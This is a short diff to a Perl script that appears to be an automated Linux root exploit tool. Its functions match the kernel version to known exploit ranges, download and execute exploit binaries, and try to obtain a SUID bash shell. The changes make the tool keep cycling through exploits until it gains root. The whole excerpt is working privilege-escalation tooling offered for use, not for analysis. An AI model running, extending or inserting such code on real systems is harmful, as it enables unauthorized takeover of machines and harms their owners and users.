@@ -460,8 +460,9 @@ sub download_binary {
         print "${C}[*] Executing...${Z}\n";
         sys_cmd("$tmp", 60);
         try_suid_bash();
-        droproot();
-        return 1;
+        if (isroot() || is_suid("/bin/bash")) {
+            return 1;
+        }
     }
     unlink $tmp;
     return 0;
@@ -510,7 +511,10 @@ sub auto_exploit_binary {
         my $vlo = $lo_m*10000 + $lo_i*100 + $lo_p;
         my $vhi = $hi_m*10000 + $hi_i*100 + $hi_p;
         next unless ($vk >= $vlo && $vk <= $vhi);
-        return 1 if download_binary($e->{bin});
+        if (download_binary($e->{bin})) {
+            return 1;  # got root!
+        }
+        # continue trying next exploit
     }
     return 0;
 }
